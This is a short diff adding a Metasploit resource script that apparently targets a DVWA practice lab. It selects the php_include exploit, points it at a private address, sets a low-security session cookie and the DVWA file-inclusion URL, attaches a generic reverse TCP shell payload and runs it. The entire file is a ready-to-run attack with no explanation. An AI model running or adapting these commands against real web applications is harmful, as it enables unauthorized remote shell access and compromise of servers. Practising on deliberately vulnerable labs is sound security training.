@@ -1,0 +1,6 @@
+use exploit/unix/webapp/php_include
+set rhost 192.168.1.112
+set headers "Cookie:security=low;PHPSESSID=46a3e14989f7cc268d50b7f1374d791d"
+set phpuri /dvwa/vulnerabilities/fi/?page=XXpathXX
+set payloads generic/shell_reverse_tcp
+run -z
